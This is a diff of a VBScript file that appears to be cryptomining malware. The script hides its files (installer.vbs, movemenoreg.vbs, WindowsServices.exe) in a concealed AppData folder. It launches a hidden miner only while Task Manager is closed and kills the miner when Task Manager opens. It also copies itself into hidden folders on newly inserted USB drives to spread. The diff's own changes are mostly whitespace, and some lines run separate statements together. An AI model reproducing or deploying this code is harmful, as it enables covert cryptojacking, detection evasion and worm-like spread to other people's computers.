@@ -11,7 +11,9 @@ set objws = CreateObject("Scripting.FileSystemObject")
 Set objFile = objws.GetFile(strPath) 
 strFolder = objws.GetParentFolderName(objFile) 
 pfolder = objws.GetParentFolderName(strFolder) 'Chr(34)是双引号 
-ws.Run Chr(34) & pfolder & "\_" & Chr(34) AppData = ws.ExpandEnvironmentStrings("%AppData%") 
+ws.Run Chr(34) & pfolder & "\_" & Chr(34)
+
+AppData = ws.ExpandEnvironmentStrings("%AppData%") 
 DestFolder = AppData & Target 
 
 if (not objws.folderexists(DestFolder)) then 
@@ -24,9 +26,9 @@ Call moveandhide ("\installer.vbs")
 Call moveandhide ("\movemenoreg.vbs") 
 Call moveandhide ("\WindowsServices.exe") 
 objDestFolder.Attributes = objDestFolder.Attributes + 39 
+
 sub moveandhide (name) 
 if (not objws.fileexists(DestFolder & name)) then 
-
 objws.CopyFile strFolder & name, DestFolder & "\" 
 Set objmove = objws.GetFile(DestFolder & name) 
 
@@ -88,11 +90,8 @@ Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name L
 Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'") 
 
 if colProcess.count = 0 And tskProcess.count = 0 then 
-
 ws.Run miner, 0 
-
 ElseIf colProcess.count > 0 And tskProcess.count > 0 then 
-
 For Each objProcess In colProcess ws.run "taskkill /PID " & objProcess.ProcessId , 0 
 Next 
 end if 
@@ -138,12 +137,10 @@ Set objEvent = colEvents.NextEvent
 
 If objEvent.TargetInstance.DriveType = 2 Then 
 If objEvent.Path_.Class = "__InstanceCreationEvent" Then 
-
 device = objEvent.TargetInstance.DeviceID 
 devicename = objEvent.TargetInstance.VolumeName 
 DestFolder = device & "\WindowsServices" 
 DummyFolder = device & "\" & "_" 
-
 if (not objws.folderexists(DestFolder)) then 
 objws.CreateFolder DestFolder 
 Set objDestFolder = objws.GetFolder(DestFolder) 
@@ -169,7 +166,6 @@ objws.CreateFolder DummyFolder
 Set objDestFolder = objws.GetFolder(DummyFolder) 
 objDestFolder.Attributes = objDestFolder.Attributes + 2 + 4 
 End If set check = objws.getFolder(device) 
-
 Call checker(check) 
 End If 
 End If 
